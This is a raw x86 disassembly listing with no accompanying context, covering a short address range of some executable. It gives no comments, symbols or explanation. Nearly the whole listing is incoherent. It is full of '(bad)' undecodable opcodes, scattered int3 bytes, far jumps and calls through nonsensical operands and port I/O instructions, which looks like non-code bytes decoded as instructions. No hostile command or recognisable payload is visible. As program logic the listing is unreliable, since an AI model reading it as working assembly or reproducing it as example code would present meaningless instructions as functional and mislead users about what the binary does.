  43921f:	add    BYTE PTR [ebp-0x7d],dl
  439222:	cmp    edi,0x0
  439225:	int3   
  439226:	cmp    al,0x81
  439228:	sbb    eax,0xadea
  43922d:	dec    esi
  43922f:	jmp    DWORD PTR [edi+edi*1-0x7c0001]
  439236:	test   DWORD PTR [edx],esi
  439238:	adc    DWORD PTR [esi-0x58],eax
  43923b:	add    bh,bh
  43923d:	add    BYTE PTR [ebp-0x1],ah
  439240:	push   es
  439241:	xchg   esi,eax
  439242:	or     DWORD PTR [ecx-0x369a7d00],0x72
  439249:	inc    ecx
  43924a:	int3   
  43924b:	cmp    edi,0xffffff83
  43924e:	push   0xff17e183
  439253:	int3   
  439254:	mov    edi,edi
  439256:	jo     0x4391db
  439258:	adc    al,0x86
  43925a:	(bad)  
  43925b:	(bad)  
  43925c:	(bad)  
  43925d:	push   DWORD PTR [ecx+0xc74383]
  439263:	(bad)  
  439264:	inc    DWORD PTR [eax]
  439266:	js     0x4391f4
  439268:	push   cs
  439269:	adc    BYTE PTR [edx-0x1],0x0
  43926d:	push   esp
  43926f:	mov    DWORD PTR [ebx+edx*1+0xffcccc],esi
  439276:	sub    DWORD PTR [ecx-0x76e0c79a],edx
  43927c:	add    BYTE PTR [ecx+0x618d83cc],cl
  439282:	add    bh,bh
  439284:	mov    edi,edi
  439286:	or     BYTE PTR [edx+0x42],ah
  439289:	inc    ebx
  43928a:	jae    0x43928c
  43928c:	cmp    edi,0x77
  43928f:	push   DWORD PTR [edx-0x76ff0009]
  439295:	jmp    FWORD PTR [eax]
  439297:	sub    BYTE PTR [ebp-0x7],bh
  43929a:	mov    al,ds:0x61000083
  43929f:	add    BYTE PTR [edi],ch
  4392a1:	xchg   edx,eax
  4392a2:	dec    esp
  4392a4:	(bad)  
  4392a5:	jmp    DWORD PTR [esi]
  4392a7:	adc    DWORD PTR [ebx],ebp
  4392a9:	mov    eax,0x89ff8976
  4392ae:	cld    
  4392af:	call   DWORD PTR [esi+ebx*4]
  4392b2:	(bad)  
  4392b3:	dec    esp
  4392b5:	add    BYTE PTR [eax+0xb],ch
  4392b8:	adc    BYTE PTR [esi-0x760000ee],ah
  4392be:	sti    
  4392bf:	add    DWORD PTR [ebx],0x2c
  4392c2:	(bad)  
  4392c3:	inc    DWORD PTR [eax]
  4392c5:	(bad)  
  4392c6:	cmp    al,bl
  4392c8:	add    al,0x1b
  4392ca:	pop    ebp
  4392cb:	(bad)  
  4392cc:	(bad)  
  4392cd:	(bad)  
  4392ce:	mov    eax,0x83ce35ff
  4392d3:	mov    edi,edi
  4392d5:	call   DWORD PTR [ecx-0x566b6118]
  4392db:	inc    DWORD PTR [eax]
  4392dd:	jmp    FWORD PTR [eax]
  4392df:	add    BYTE PTR [edx-0x7c00ff08],al
  4392e5:	call   DWORD PTR [eax+0x75]
  4392e8:	popf   
  4392e9:	sub    esp,DWORD PTR [edi+0x0]
  4392ec:	add    BYTE PTR [ebx-0x1ef1ff6f],al
  4392f2:	add    BYTE PTR [eax],al
  4392f4:	dec    DWORD PTR [ecx-0x1a985780]
  4392fa:	push   0x7cccffff
  4392ff:	jmp    DWORD PTR [ebp+0x33]
  439302:	add    bh,bh
  439304:	inc    DWORD PTR [eax]
  439306:	rep lock lods al,BYTE PTR ds:[esi]
  439309:	scas   eax,DWORD PTR es:[edi]
  43930a:	je     0x43930c
  43930c:	add    bh,bh
  43930e:	mov    cl,0x83
  439310:	or     eax,0xffff00b4
  439315:	call   DWORD PTR ds:0xe114e1de
  43931b:	inc    DWORD PTR [eax]
  43931d:	add    bh,ch
  43931f:	mov    DWORD PTR [edi],ebx
  439321:	jle    0x439322
  439323:	add    bh,bh
  439325:	push   DWORD PTR [edi]
  439327:	pop    edx
  439328:	cld    
  439329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43932a:	pop    eax
  43932b:	add    BYTE PTR [ebx+0x62ff9683],al
  439331:	inc    esp
  439332:	mov    DWORD PTR [eax],eax
  439334:	inc    DWORD PTR [eax]
  439336:	add    esi,DWORD PTR es:[edi+0x77]
  43933a:	cmp    edi,edi
  43933c:	inc    DWORD PTR [eax]
  43933e:	(bad)  
  43933f:	jmp    FWORD PTR [esi]
  439341:	dec    esi
  439342:	add    bh,bh
  439344:	add    BYTE PTR [ebx+0x539b2988],al
  43934a:	idiv   edi
  43934c:	cmp    edi,0xffffffef
  43934f:	(bad)  
  439350:	mov    esi,0xff8376
  439355:	add    BYTE PTR [esp+ebp*2-0x53],cl
  439359:	jle    0x439379
  43935b:	add    DWORD PTR [eax],0xffffffff
  43935e:	(bad)  
  43935f:	jmp    FWORD PTR [ecx+0x78]
  439362:	or     DWORD PTR [ecx-0x19160100],0xffffffbd
  439369:	aas    
  43936a:	pusha  
  43936b:	int3   
  43936c:	(bad)  
  43936d:	dec    ebx
  43936f:	int3   
  439370:	out    0xa2,al
  439372:	inc    DWORD PTR [eax]
  439374:	mov    DWORD PTR [eax],eax
  439376:	inc    edx
  439377:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439378:	sub    edi,DWORD PTR [ebp-0x7c7cffc4]
  43937e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43937f:	(bad)  
  439380:	sti    
  439381:	out    0x0,eax
  439383:	cmp    edi,0xffffffff
  439386:	sbb    DWORD PTR [ebx-0x7c336b26],0x0
  43938d:	inc    edx
  43938f:	add    BYTE PTR ds:0xffff39,cl
  439395:	(bad)  
  439396:	in     eax,dx
  439397:	mov    ds:0xffda7014,al
  43939c:	(bad)  
  43939d:	(bad)  
  43939e:	js     0x4393a0
  4393a0:	in     al,0x11
  4393a2:	dec    DWORD PTR [ecx+0x2525ffff]
  4393a8:	je     0x43932b
  4393aa:	out    dx,eax
  4393ab:	int3   
  4393ac:	add    bh,bh
  4393ae:	adc    al,0x0
  4393b0:	scas   al,BYTE PTR es:[edi]
  4393b1:	icebp  
  4393b2:	(bad)  
  4393b3:	inc    DWORD PTR [ebx+0x3c0272ff]
  4393b9:	xchg   ecx,eax
  4393ba:	push   ebx
  4393bb:	int3   
  4393bc:	mov    DWORD PTR [eax],eax
  4393be:	mov    dh,0x0
  4393c0:	sub    BYTE PTR [esi-0x7d],ch
  4393c3:	inc    DWORD PTR [ebx+0x2cf92eff]
  4393c9:	arpl   WORD PTR [edi-0x7d],bp
  4393cc:	add    BYTE PTR [eax],al
  4393ce:	jg     0x43939c
  4393d0:	sbb    edx,0xffffffff
  4393d3:	inc    DWORD PTR [ebx-0x7ea29b01]
  4393d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4393da:	out    dx,eax
  4393db:	inc    DWORD PTR [ebx-0x41007200]
  4393e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4393e2:	int3   
  4393e3:	inc    DWORD PTR [eax]
  4393e5:	add    BYTE PTR [ecx],cl
  4393e7:	dec    ecx
  4393e8:	mov    esi,0x89ced8
  4393ed:	jmp    FWORD PTR [ecx]
  4393ef:	mov    DWORD PTR [eax-0xffff57],edi
  4393f5:	add    BYTE PTR [edx-0x63],cl
  4393f8:	inc    ebx
  4393f9:	dec    ebp
  4393fa:	dec    esi
  4393fb:	add    BYTE PTR [ebx-0x74ff3101],al
  439401:	mov    eax,DWORD PTR [ebx+0x5d89ffff]
  439407:	loope  0x43945b
  439409:	mov    ah,0xfb
  43940b:	add    BYTE PTR [eax],al
  43940d:	inc    DWORD PTR [ebp+0xfba400]
  439413:	(bad)  
  439414:	inc    DWORD PTR [eax]
  439416:	sub    bh,BYTE PTR [edx]
  439418:	xlat   BYTE PTR ds:[ebx]
  439419:	(bad)  
  43941a:	retf   
  43941b:	add    bh,bh
  43941d:	dec    esp
  43941f:	add    DWORD PTR ds:0xff00ff4f,0xffffffff
  439426:	ds loopne 0x439495
  439429:	mov    bh,0x26
  43942b:	(bad)  
  43942c:	(bad)  
  43942d:	push   DWORD PTR [ebp-0x1]
  439430:	imul   edi,ebx,0xffffffff
  439433:	(bad)  
  439434:	(bad)  
  439435:	(bad)  
  439436:	(bad)  
  439437:	sbb    ecx,DWORD PTR [edx-0x1a]
  43943a:	push   es
  43943b:	add    ah,cl
  43943d:	add    BYTE PTR [edi],cl
  43943f:	add    BYTE PTR [esi-0x3333eb],dl
  439445:	jmp    edi
  439447:	lods   eax,DWORD PTR ds:[esi]
  439448:	call   0x83c6fc7a
  43944d:	int3   
  43944e:	outs   dx,DWORD PTR ds:[esi]
  43944f:	jmp    DWORD PTR [ecx]
  439451:	cwde   
  439452:	add    bh,bh
  439454:	(bad)  
  439455:	(bad)  
  439456:	out    dx,eax
  439457:	cmp    dh,BYTE PTR [ebp-0x137a]
  43945d:	int3   
  43945e:	lahf   
  43945f:	push   DWORD PTR [eax+0x11]
  439462:	(bad)  
  439463:	(bad)  
  439464:	inc    DWORD PTR [eax]
  439466:	(bad)  
  439467:	adc    esp,DWORD PTR [edi+ebx*4-0x33007656]
  43946e:	sar    edi,cl
  439470:	scas   al,BYTE PTR es:[edi]
  439471:	inc    DWORD PTR fs:[ebx+0xf83ffff]
  439478:	lahf   
  439479:	xchg   edx,eax
  43947a:	adc    eax,0xd1cc83ff
  43947f:	int3   
  439480:	jae    0x439448
  439482:	add    bh,bh
  439484:	(bad)  
  439485:	call   FWORD PTR [ebx+eax*1+0x9d2061]
  43948c:	(bad)  
  43948d:	push   DWORD PTR [ebp-0x1]
  439490:	mov    edx,0xffffff26
  439495:	mov    edi,edi
  439497:	jae    0x4394e4
  439499:	add    edx,esi
  43949b:	(bad)  
  43949c:	inc    DWORD PTR [eax]
  43949e:	cmp    al,0x0
  4394a0:	icebp  
  4394a1:	pushf  
  4394a2:	dec    esp
  4394a4:	add    DWORD PTR [eax],0x54
  4394a7:	mov    edx,0x89c6342c
  4394ac:	inc    DWORD PTR [ebx-0x1d2300be]
  4394b2:	int3   
  4394b3:	add    bh,bh
  4394b5:	mov    DWORD PTR [ebx],ebp
  4394b7:	jecxz  0x4394f8
  4394b9:	jge    0x439449
  4394bb:	inc    DWORD PTR [eax]
  4394bd:	adc    ebx,0x0
  4394c0:	xchg   ebp,eax
  4394c1:	fcmove st,st(4)
  4394c3:	(bad)  
  4394c4:	dec    esp
  4394c6:	test   eax,0xaf508108
  4394cb:	inc    DWORD PTR [eax]
  4394cd:	mov    DWORD PTR [ebx-0xe3f177],edx
  4394d3:	add    BYTE PTR [eax],al
  4394d5:	add    BYTE PTR [eax+ecx*8+0x46],dh
  4394d9:	pop    DWORD PTR [edi+edi*8-0xbf7634]
  4394e0:	repz xchg esi,eax
  4394e2:	(bad)  
  4394e3:	(bad)  
  4394e4:	inc    DWORD PTR [eax]
  4394e6:	xor    DWORD PTR [edx-0x2e801e],0x0
  4394ed:	add    DWORD PTR [ebx-0x7cf74e01],0xffffffcc
  4394f4:	dec    esp
  4394f6:	push   0xd9ca1b61
  4394fb:	add    BYTE PTR [ebx+0x2affef00],al
  439501:	add    eax,0x83ffff83
  439506:	ds push ss
  439508:	mov    esi,DWORD PTR [eax+0x49]
  43950b:	add    BYTE PTR [ecx-0x44769301],cl
  439511:	lods   eax,DWORD PTR ds:[esi]
  439512:	(bad)  
  439513:	(bad)  
  439514:	inc    DWORD PTR [eax]
  439516:	arpl   WORD PTR [ebx+0x44],si
  439519:	gs xor bh,bh
  43951c:	add    bh,bh
  43951e:	dec    ecx
  43951f:	add    BYTE PTR [ecx],al
  439521:	cmp    BYTE PTR [ebx+0x4f000083],al
  439527:	int    0xde
  439529:	inc    edx
  43952a:	sub    BYTE PTR [eax],al
  43952c:	mov    edi,edi
  43952e:	mov    edi,0x890d5400
  439533:	(bad)  
  439534:	(bad)  
  439535:	jmp    DWORD PTR [esi]
  439537:	(bad)  
  439538:	cmp    DWORD PTR [ecx+0x57],esi
  43953b:	add    ah,cl
  43953d:	add    BYTE PTR [eax],bh
  43953f:	add    BYTE PTR [edi+0x5a],cl
  439542:	int3   
  439543:	add    BYTE PTR [ebx+0x3d80bcc],al
  439549:	mov    dl,0x8f
  43954b:	(bad)  
  43954c:	(bad)  
  43954d:	call   DWORD PTR [eax]
  43954f:	add    BYTE PTR [ebx+0x53],dh
  439552:	add    DWORD PTR [eax],0xffffff83
  439555:	push   DWORD PTR [ebp+0x37]
  439558:	cmp    ebx,esp
  43955a:	jnp    0x4394df
  43955c:	add    BYTE PTR [eax],al
  43955e:	add    DWORD PTR cs:[edx+0xff83bd],0x0
  439566:	dec    DWORD PTR [edi+eax*1+0xff4b40]
  43956d:	int3   
  43956e:	xor    al,BYTE PTR [eax]
  439570:	or     dh,al
  439572:	add    bh,bh
  439574:	(bad)  
  439575:	call   FWORD PTR [eax+esi*2]
  439578:	or     ebp,DWORD PTR [ebp+0x8900b6]
  43957e:	xor    DWORD PTR [ebx-0x330132],eax
  439584:	add    bh,bh
  439586:	je     0x439538
  439588:	inc    esi
  439589:	dec    ebp
  43958a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43958b:	add    ah,cl
  43958d:	add    BYTE PTR [edi-0xd06001],bh
  439593:	(bad)  
  439594:	dec    esp
  439596:	mov    al,ds:0x6498e2ed
  43959b:	inc    DWORD PTR [eax]
  43959d:	call   FWORD PTR [ebx+0x0]
  4395a0:	repnz aad 0x0
  4395a3:	inc    DWORD PTR [eax]
  4395a5:	call   FWORD PTR [edi-0x11]
  4395a8:	sub    eax,0xff006582
  4395ad:	jmp    FWORD PTR [esi]
  4395af:	call   DWORD PTR [ebp-0x76]
  4395b2:	inc    DWORD PTR [eax]
  4395b4:	add    bh,bh
  4395b6:	sbb    al,0xee
  4395b8:	repz dec ebp
  4395ba:	lock inc DWORD PTR [ebx-0x32ff0d7d]
  4395c1:	sar    edi,0x0
  4395c4:	dec    esp
  4395c6:	dec    eax
  4395c7:	loop   0x439557
  4395c9:	mov    esp,0x8915
  4395ce:	mov    ?,edi
  4395d0:	js     0x439587
  4395d2:	add    DWORD PTR [eax],0xffffffff
  4395d5:	add    al,cl
  4395d7:	xchg   edx,eax
  4395d8:	rol    bl,0x47
  4395db:	add    BYTE PTR [eax],al
  4395dd:	and    esi,0xffffffcc
  4395e0:	inc    eax
  4395e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4395e2:	inc    DWORD PTR [eax]
  4395e4:	inc    DWORD PTR [eax]
  4395e6:	jmp    0x439633
  4395e8:	mov    gs,WORD PTR [edx+0x34]
  4395eb:	int3   
  4395ec:	add    bh,bh
  4395ee:	in     al,dx
  4395ef:	jmp    DWORD PTR [edi]
  4395f1:	in     eax,0xff
  4395f3:	(bad)  
  4395f4:	(bad)  
  4395f5:	inc    DWORD PTR [eax]
  4395f7:	lahf   
  4395f8:	and    ecx,esp
  4395fa:	fild   DWORD PTR [eax]
  4395fc:	or     esp,0x53
  4395ff:	dec    DWORD PTR [ecx-0x59]
  439605:	int3   
  439606:	or     cl,BYTE PTR [edx+ecx*4-0x6b]
  43960a:	jle    0x43960b
  43960c:	int3   
  43960d:	mov    eax,edi
  43960f:	add    BYTE PTR [ecx-0x2d],ch
  439612:	add    BYTE PTR [eax],al
  439614:	(bad)  
  439615:	push   DWORD PTR [edi-0x33]
  439618:	pop    es
  439619:	mov    DWORD PTR [edi+0x1700ff83],edx
  43961f:	add    ah,ch
  439621:	sti    
  439622:	dec    esp
  439624:	mov    edi,edi
  439626:	sbb    al,0x53
  439628:	scas   al,BYTE PTR es:[edi]
  439629:	pextrw eax,(bad),0xc5
  43962b:	add    DWORD PTR [ebx+0x2affe700],0x7d
  439632:	inc    DWORD PTR [eax]
  439634:	add    bh,bh
  439636:	(bad)  
  439637:	and    al,0xe
  439639:	mov    dh,0xde
  43963b:	inc    DWORD PTR [eax]
  43963d:	(bad)  
  43963e:	mov    edi,0xcce11500
  439643:	dec    esp
  439645:	add    ah,ch
  439647:	inc    DWORD PTR [ecx-0x55]
  43964a:	std    
  43964b:	(bad)  
  43964c:	(bad)  
  43964d:	jmp    esp
  43964f:	call   edi
  439651:	loop   0x439652
  439653:	add    BYTE PTR [ebx-0x42eb1d00],al
  439659:	push   0xffffffdf
  43965b:	add    BYTE PTR [ecx-0x7cff827d],cl
  439661:	mov    ah,0x83
  439663:	or     DWORD PTR [ecx-0x2f007e01],0x2
  43966a:	push   cs
  43966b:	(bad)  
  43966c:	inc    DWORD PTR [eax]
  43966e:	mov    BYTE PTR [ebx+0xff3650],al
  439674:	dec    esp
  439676:	pop    edx
  439677:	(bad)  
  439679:	in     eax,0xae
  43967b:	(bad)  
  43967c:	(bad)  
  43967d:	call   FWORD PTR [edi-0x541101]
  439683:	add    BYTE PTR [eax],al
  439685:	add    ch,dl
  439687:	add    al,0x1b
  439689:	scas   al,BYTE PTR es:[edi]
  43968a:	pop    ss
  43968b:	inc    DWORD PTR [eax]
  43968d:	call   DWORD PTR [edx]
  43968f:	call   DWORD PTR [esp+ecx*2+0xffff]
  439696:	adc    DWORD PTR [esi+0x5c7e72],ebx
  43969c:	inc    DWORD PTR [eax]
  43969e:	dec    ebx
  43969f:	add    BYTE PTR [edi-0x31],cl
  4396a2:	int3   
  4396a3:	inc    DWORD PTR [eax]
  4396a5:	add    BYTE PTR [ecx-0x35],cl
  4396a8:	aaa    
  4396a9:	add    eax,0xffffff44
  4396ae:	leave  
  4396af:	call   FWORD PTR [esi+0x2c]
  4396b2:	add    bh,bh
  4396b4:	mov    DWORD PTR [eax],eax
  4396b6:	shl    esi,1
  4396b8:	jg     0x43972a
  4396ba:	(bad)  
  4396bc:	add    BYTE PTR [ebx+0x68e1009f],al
  4396c2:	(bad)  
  4396c3:	inc    DWORD PTR [eax]
  4396c5:	dec    DWORD PTR ds:0x4767ceb5
  4396cb:	(bad)  
  4396cc:	inc    DWORD PTR [eax]
  4396ce:	add    edi,edi
  4396d0:	icebp  
  4396d1:	retf   
  4396d2:	(bad)  
  4396d3:	(bad)  
  4396d4:	(bad)  
  4396d5:	jmp    FWORD PTR [edi+0x58b63fc4]
  4396db:	add    ah,cl
  4396dd:	call   FWORD PTR [ecx-0x7d]
  4396e0:	and    cl,0xff
  4396e3:	(bad)  
  4396e4:	(bad)  
  4396e5:	jmp    FWORD PTR [esi+eax*8+0x7]
  4396e9:	hlt    
  4396ea:	sub    eax,0x10ffffcc
  4396ef:	add    al,ah
  4396f1:	call   0x5cc:0x8983ffff
  4396f8:	cmp    eax,DWORD PTR [edx-0x7c00e4]
  4396fe:	pop    es
  4396ff:	add    BYTE PTR [ebp+0x18],ch
  439702:	add    DWORD PTR [ebx-0x1882ff01],0xffffffef
  439709:	je     0x439769
  43970b:	dec    DWORD PTR [ecx-0x5a767e01]
  439711:	repnz mov edi,edi
  439714:	inc    DWORD PTR [eax]
  439716:	inc    ecx
  439717:	int    0x99
  439719:	sar    cl,cl
  43971b:	inc    DWORD PTR [eax]
  43971d:	int3   
  43971e:	arpl   di,di
  439720:	inc    ebx
  439721:	nop
  439722:	dec    esp
  439724:	int3   
  439725:	xor    ecx,0xffffffc9
  439728:	or     eax,0x83ff7a6e
  43972d:	add    BYTE PTR [edx-0x1],al
  439730:	xchg   ebp,eax
  439731:	sub    edi,edi
  439733:	add    BYTE PTR [eax],al
  439735:	and    DWORD PTR [edx+ebp*2],0xffffffbf
  439739:	(bad)  
  43973a:	mov    DWORD PTR [eax],eax
  43973c:	add    DWORD PTR [eax],0x40
  43973f:	jmp    DWORD PTR [ebx]
  439741:	cmp    BYTE PTR [eax],al
  439743:	add    bh,bh
  439745:	(bad)  
  439746:	(bad)  
  439748:	or     al,0x27
  43974a:	popa   
  43974b:	int3   
  43974c:	mov    edi,edi
  43974e:	loop   0x4396d3
  439750:	dec    eax
  439751:	xor    eax,0xcc0083ff
  439756:	ins    BYTE PTR es:[edi],dx
  439757:	add    eax,0xff5233eb
  43975c:	add    BYTE PTR [eax],al
  43975e:	sub    bh,bh
  439760:	mov    cl,0xa6
  439762:	mov    edi,edi
  439764:	int3   
  439765:	add    BYTE PTR [eax],ah
  439767:	mov    bh,0x5f
  439769:	(bad)  
  43976b:	add    BYTE PTR [ecx-0x6200da7d],cl
  439771:	xchg   esp,eax
  439772:	add    BYTE PTR [eax],al
  439774:	(bad)  
  439775:	push   DWORD PTR [edi-0x12]
  439778:	mov    al,BYTE PTR [ebx+0xff0069]
  43977e:	dec    edx
  43977f:	int3   
  439780:	das    
  439781:	ror    BYTE PTR [ecx+0x72ffffff],cl
  439787:	js     0x439723
  439789:	sbb    al,0x98
  43978b:	add    bh,bh
  43978d:	add    BYTE PTR [ebp+0x1f8000],dl
  439793:	int3   
  439794:	add    BYTE PTR [ecx-0x7fa7b37b],cl
  43979a:	add    BYTE PTR fs:[ebx-0x2f00df77],al
  4397a1:	sub    al,0x89
  4397a3:	add    BYTE PTR [eax],al
  4397a5:	(bad)  
  4397a6:	cmp    eax,0x21b19c0f
  4397ab:	add    BYTE PTR [ebx-0x6fffae00],al
  4397b1:	mov    cs,WORD PTR [ecx-0x10330001]
  4397b7:	pop    eax
  4397b8:	xor    al,BYTE PTR [ecx+ebx*1+0x0]
  4397bc:	inc    DWORD PTR [ebx+0x263dffc9]
  4397c2:	inc    DWORD PTR [eax]
  4397c4:	inc    DWORD PTR [ebx-0x2ca2d4a7]
  4397ca:	aas    
  4397cb:	inc    DWORD PTR [ebx+0x600b100]
  4397d1:	and    BYTE PTR [ebx-0x54000001],al
  4397d7:	clc    
  4397d8:	pop    ebx
  4397d9:	int    0x4f
  4397db:	inc    DWORD PTR [eax]
  4397dd:	add    BYTE PTR [ecx-0x77],bh
  4397e0:	ror    DWORD PTR [edx],cl
  4397e2:	add    ah,cl
  4397e4:	(bad)  
  4397e5:	dec    DWORD PTR [ebp-0x44]
  4397e8:	test   bh,cl
  4397ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4397eb:	inc    DWORD PTR [eax]
  4397ed:	jmp    esi
  4397ef:	and    edi,0xffffffc5
  4397f2:	add    BYTE PTR [eax],al
  4397f4:	or     esp,0x3d
  4397f7:	xchg   esp,eax
  4397f8:	lods   eax,DWORD PTR ds:[si]
  4397fa:	or     eax,0x67ff00ff
  4397ff:	add    BYTE PTR [ecx+0x62],bl
  439802:	add    bh,bh
  439804:	(bad)  
  439805:	jmp    FWORD PTR [eax]
  439807:	sub    DWORD PTR [ebx+0xfffb68],0xf2ff8a00
  439811:	ins    BYTE PTR es:[edi],dx
  439812:	inc    DWORD PTR [eax]
  439814:	inc    DWORD PTR [eax]
  439816:	rcl    DWORD PTR [esi+esi*2],1
  439819:	mov    ds:0xff00cc3b,al
  43981e:	add    al,0x89
  439820:	jnp    0x4397ce
  439822:	add    BYTE PTR [ebx+0x7c29ff00],al
  439828:	push   ds
  439829:	inc    edi
  43982a:	xor    eax,DWORD PTR [ebx-0xf5007d]
  439830:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439831:	xchg   edi,eax
  439832:	inc    DWORD PTR [eax]
  439834:	add    BYTE PTR [ebx+0x246ea1ee],al
  43983a:	sar    bh,cl
  43983c:	inc    DWORD PTR [eax]
  43983e:	inc    DWORD PTR [eax]
  439840:	ret    0xffe2
  439843:	mov    edi,edi
  439845:	(bad)  
  439846:	cmp    dl,ch
  439848:	ret    0x5788
  43984b:	add    BYTE PTR [eax],al
  43984d:	call   eax
  43984f:	dec    eax
  439851:	mov    bh,0xff
  439853:	add    BYTE PTR [eax],al
  439855:	add    BYTE PTR [eax+0x61fb65b1],ah
  43985b:	inc    DWORD PTR [eax]
  43985d:	jmp    esp
  43985f:	mov    DWORD PTR [eax],edx
  439861:	test   BYTE PTR [ecx+0xfffffff],cl
  439867:	xchg   ecx,eax
  439868:	loope  0x43983b
  43986a:	outs   dx,BYTE PTR ds:[esi]
  43986b:	cmp    edi,0xffffffcc
  43986e:	xor    ecx,esp
  439870:	icebp  
  439871:	idiv   edi
  439873:	add    BYTE PTR [eax],al
  439875:	add    BYTE PTR [eax],ch
  439877:	jo     0x439821
  439879:	and    cl,cl
  43987b:	inc    DWORD PTR [ebx-0x2700a07d]
  439881:	nop
  439882:	inc    DWORD PTR [eax]
  439884:	inc    DWORD PTR [eax]
  439886:	iret   
  439887:	imul   esi,ecx,0xffffffd0
  43988a:	scas   eax,DWORD PTR es:[edi]
  43988b:	add    DWORD PTR [eax],0x0
  43988e:	push   esi
  43988f:	mov    ebp,ebp
  439891:	mov    ch,0xff
  439893:	add    bh,bh
  439895:	call   FWORD PTR [ebx-0x6d]
  439898:	and    ch,BYTE PTR [ebx-0x7600ff5b]
  43989e:	sti    
  43989f:	add    dh,ch
  4398a1:	jno    0x439826
  4398a3:	mov    DWORD PTR [ebx-0x15ccd201],eax
  4398a9:	dec    esi
  4398aa:	push   ss
  4398ab:	add    DWORD PTR [eax],0x0
  4398ae:	out    0xff,eax
  4398b0:	iret   
  4398b1:	xchg   edi,edi
  4398b3:	add    bh,bh
  4398b5:	add    al,dl
  4398b7:	fidivr WORD PTR [ebp-0x5c]
  4398ba:	ja     0x439888
  4398bc:	(bad)  
  4398bd:	push   DWORD PTR [ebp-0x7c44ea01]
  4398c3:	(bad)  
  4398c4:	(bad)  
  4398c5:	jmp    DWORD PTR [eax+0x45]
  4398c8:	jp     0x43989a
  4398ca:	daa    
  4398cb:	int3   
  4398cc:	or     esp,0x4f
  4398cf:	mov    DWORD PTR [edx+edi*2-0x33330001],ebx
  4398d6:	jae    0x439873
  4398d8:	ja     0x439906
  4398da:	adc    DWORD PTR [ecx-0x3d7601],ecx
  4398e0:	ret    0x898c
  4398e3:	(bad)  
  4398e4:	dec    esp
  4398e6:	mov    DWORD PTR [ecx-0x4b],edx
  4398e9:	cmp    eax,0xff00002f
  4398ee:	mov    bh,bh
  4398f0:	push   edi
  4398f1:	xlat   BYTE PTR ds:[ebx]
  4398f2:	int3   
  4398f3:	(bad)  
  4398f4:	(bad)  
  4398f5:	inc    edx
  4398f7:	popa   
  4398f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4398f9:	iret   
  4398fa:	call   0xf800:0xa7ff00ff
  439901:	rol    DWORD PTR [eax],1
  439903:	add    bh,bh
  439905:	int3   
  439906:	inc    esi
  439907:	lods   al,BYTE PTR ds:[esi]
  439908:	into   
  439909:	rcr    edx,0x0
  43990c:	inc    DWORD PTR [eax]
  43990e:	pop    ss
  43990f:	add    BYTE PTR [esi-0xf4],bl
  439915:	add    bl,cl
  439917:	repz sub al,0x72
  43991a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43991b:	(bad)  
  43991c:	inc    DWORD PTR [ebx-0x12de008b]
  439922:	inc    DWORD PTR [eax]
  439924:	(bad)  
  439925:	call   FWORD PTR [eax]
  439927:	sbb    DWORD PTR ds:0xccff27ce,ebx
  43992d:	add    bh,cl
  43992f:	mov    DWORD PTR [edx-0x41],esi
  439932:	inc    DWORD PTR [eax]
  439934:	(bad)  
  439935:	inc    DWORD PTR [esi+eax*2-0xe9f0ae]
  43993c:	cmp    edi,0xffffffa0
  43993f:	add    BYTE PTR [esi+0x43],ah
  439942:	(bad)  
  439943:	(bad)  
  439944:	(bad)  
  439945:	jmp    FWORD PTR [ecx]
  439947:	das    
  439948:	jg     0x43998e
  43994a:	int    0xff
  43994c:	add    BYTE PTR [eax],al
  43994e:	inc    edi
  43994f:	(bad)  
  439950:	jnp    0x4398fb
  439952:	add    BYTE PTR [ecx-0xf7b7c34],cl
  439958:	test   al,0x92
  43995a:	dec    ebp
  43995b:	add    bh,bh
  43995d:	add    BYTE PTR [ebx-0x1],ch
  439960:	sbb    ecx,DWORD PTR [eax-0x7c007601]
  439966:	pop    ebp
  439967:	add    eax,0xfffd2141
  43996c:	(bad)  
  43996d:	(bad)  
  43996e:	jnp    0x43996f
  439970:	jne    0x4399ce
  439972:	(bad)  
  439973:	inc    DWORD PTR [eax]
  439975:	add    BYTE PTR [ebx],al
  439977:	imul   esp,edi,0xff002f82
  43997d:	push   edi
  43997f:	jmp    DWORD PTR [esi+0x31]
  439982:	(bad)  
  439983:	inc    DWORD PTR [eax]
  439985:	add    BYTE PTR [eax],ah
  439987:	sbb    DWORD PTR [ebp-0x4ab0],edx
  43998d:	call   DWORD PTR [eax+eax*1+0x24]
  439991:	stc    
  439992:	dec    esp
  439994:	(bad)  
  439995:	jmp    DWORD PTR [esp+ecx*8]
  439998:	jp     0x439972
  43999a:	pusha  
  43999b:	int3   
  43999c:	inc    DWORD PTR [eax]
  43999e:	imul   eax,DWORD PTR [eax],0xffffffd7
  4399a1:	dec    esp
  4399a2:	(bad)  
  4399a3:	inc    DWORD PTR [ebx+0x2d08bcff]
  4399a9:	add    ch,ch
  4399ab:	(bad)  
  4399ac:	(bad)  
  4399ad:	jmp    DWORD PTR [edi+edi*8-0x8806]
  4399b4:	int3   
  4399b5:	add    BYTE PTR [ecx],al
  4399b7:	mov    dl,0x99
  4399b9:	(bad)  
  4399ba:	sahf   
  4399bb:	mov    DWORD PTR [eax],eax
  4399bd:	or     DWORD PTR [ebx-0x1],0x39
  4399c1:	out    0xff,al
  4399c3:	int3   
  4399c4:	add    BYTE PTR [eax],al
  4399c6:	and    al,0x8b
  4399c8:	dec    edi
  4399c9:	out    dx,eax
  4399ca:	sbb    cl,BYTE PTR [ecx+0xf9ff00]
  4399d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4399d1:	mov    cl,0xff
  4399d3:	cmp    edi,0xffffffcc
  4399d6:	in     eax,0x29
  4399d8:	test   esi,eax
  4399da:	push   ss
  4399db:	(bad)  
  4399dc:	(bad)  
  4399dd:	jmp    FWORD PTR [ebx-0x96ca01]
  4399e3:	add    bh,bh
  4399e5:	cmp    DWORD PTR [eax+0x33],0xffffffb6
